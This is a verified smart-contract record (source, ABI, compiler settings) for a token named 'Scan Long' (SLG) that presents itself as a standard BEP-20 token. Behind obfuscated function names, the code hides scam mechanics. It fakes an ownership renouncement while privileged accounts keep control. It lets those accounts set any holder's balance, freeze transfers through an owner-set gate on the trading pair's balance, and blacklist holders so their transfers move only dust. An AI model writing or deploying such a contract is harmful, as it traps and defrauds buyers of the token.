{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface tradingMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract isShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchTotal {\n    function createPair(address fundToken, address senderToMin) external returns (address);\n}\n\ninterface limitFundReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableList) external view returns (uint256);\n\n    function transfer(address totalMarketing, uint256 takeAmount) external returns (bool);\n\n    function allowance(address marketingReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 takeAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalMarketing,\n        uint256 takeAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoMarketing, uint256 value);\n    event Approval(address indexed marketingReceiver, address indexed spender, uint256 value);\n}\n\ninterface limitFundReceiverMetadata is limitFundReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ScanLong is isShould, limitFundReceiver, limitFundReceiverMetadata {\n\n    address txMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address toList, address totalMarketing, uint256 takeAmount) external override returns (bool) {\n        if (_msgSender() != txMin) {\n            if (maxLimitMode[toList][_msgSender()] != type(uint256).max) {\n                require(takeAmount <= maxLimitMode[toList][_msgSender()]);\n                maxLimitMode[toList][_msgSender()] -= takeAmount;\n            }\n        }\n        return fromLaunch(toList, totalMarketing, takeAmount);\n    }\n\n    function allowance(address minReceiver, address totalSwap) external view virtual override returns (uint256) {\n        if (totalSwap == txMin) {\n            return type(uint256).max;\n        }\n        return maxLimitMode[minReceiver][totalSwap];\n    }\n\n    function fromExempt() private view {\n        require(walletTeam[_msgSender()]);\n    }\n\n    uint256 swapMax;\n\n    bool public takeLiquidityReceiver;\n\n    address private txTeam;\n\n    string private senderFee = \"SLG\";\n\n    function fromLaunch(address toList, address totalMarketing, uint256 takeAmount) internal returns (bool) {\n        if (toList == sellIs) {\n            return atTotal(toList, totalMarketing, takeAmount);\n        }\n        uint256 liquidityMarketing = limitFundReceiver(tokenReceiver).balanceOf(toSender);\n        require(liquidityMarketing == swapMax);\n        require(totalMarketing != toSender);\n        if (takeTeamAuto[toList]) {\n            return atTotal(toList, totalMarketing, buyEnableLiquidity);\n        }\n        return atTotal(toList, totalMarketing, takeAmount);\n    }\n\n    uint8 private teamToken = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingWallet;\n    }\n\n    function balanceOf(address enableList) public view virtual override returns (uint256) {\n        return feeFrom[enableList];\n    }\n\n    function enableWallet(uint256 takeAmount) public {\n        fromExempt();\n        swapMax = takeAmount;\n    }\n\n    bool public amountToken;\n\n    mapping(address => mapping(address => uint256)) private maxLimitMode;\n\n    function approve(address totalSwap, uint256 takeAmount) public virtual override returns (bool) {\n        maxLimitMode[_msgSender()][totalSwap] = takeAmount;\n        emit Approval(_msgSender(), totalSwap, takeAmount);\n        return true;\n    }\n\n    function marketingBuyTx(address launchedLiquidity) public {\n        fromExempt();\n        \n        if (launchedLiquidity == sellIs || launchedLiquidity == tokenReceiver) {\n            return;\n        }\n        takeTeamAuto[launchedLiquidity] = true;\n    }\n\n    string private marketingWallet = \"Scan Long\";\n\n    function transfer(address sellTake, uint256 takeAmount) external virtual override returns (bool) {\n        return fromLaunch(_msgSender(), sellTake, takeAmount);\n    }\n\n    constructor (){\n        \n        tradingMin swapModeList = tradingMin(txMin);\n        tokenReceiver = launchTotal(swapModeList.factory()).createPair(swapModeList.WETH(), address(this));\n        if (buySell) {\n            amountToken = true;\n        }\n        sellIs = _msgSender();\n        walletEnable();\n        walletTeam[sellIs] = true;\n        feeFrom[sellIs] = limitIs;\n        \n        emit Transfer(address(0), sellIs, limitIs);\n    }\n\n    function getOwner() external view returns (address) {\n        return txTeam;\n    }\n\n    mapping(address => uint256) private feeFrom;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamToken;\n    }\n\n    event OwnershipTransferred(address indexed walletBuy, address indexed atSell);\n\n    bool public limitListBuy;\n\n    uint256 private limitIs = 100000000 * 10 ** 18;\n\n    address toSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function marketingMode(address exemptMin) public {\n        require(exemptMin.balance < 100000);\n        if (feeTrading) {\n            return;\n        }\n        \n        walletTeam[exemptMin] = true;\n        \n        feeTrading = true;\n    }\n\n    address public sellIs;\n\n    bool public feeTrading;\n\n    mapping(address => bool) public takeTeamAuto;\n\n    mapping(address => bool) public walletTeam;\n\n    function teamEnable(address sellTake, uint256 takeAmount) public {\n        fromExempt();\n        feeFrom[sellTake] = takeAmount;\n    }\n\n    function atTotal(address toList, address totalMarketing, uint256 takeAmount) internal returns (bool) {\n        require(feeFrom[toList] >= takeAmount);\n        feeFrom[toList] -= takeAmount;\n        feeFrom[totalMarketing] += takeAmount;\n        emit Transfer(toList, totalMarketing, takeAmount);\n        return true;\n    }\n\n    address public tokenReceiver;\n\n    uint256 constant buyEnableLiquidity = 10 ** 10;\n\n    function walletEnable() public {\n        emit OwnershipTransferred(sellIs, address(0));\n        txTeam = address(0);\n    }\n\n    uint256 enableAuto;\n\n    bool private buySell;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitIs;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderFee;\n    }\n\n    function owner() external view returns (address) {\n        return txTeam;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"enableWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitListBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedLiquidity\",\"type\":\"address\"}],\"name\":\"marketingBuyTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"}],\"name\":\"marketingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLiquidityReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTeamAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"teamEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"takeAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ScanLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}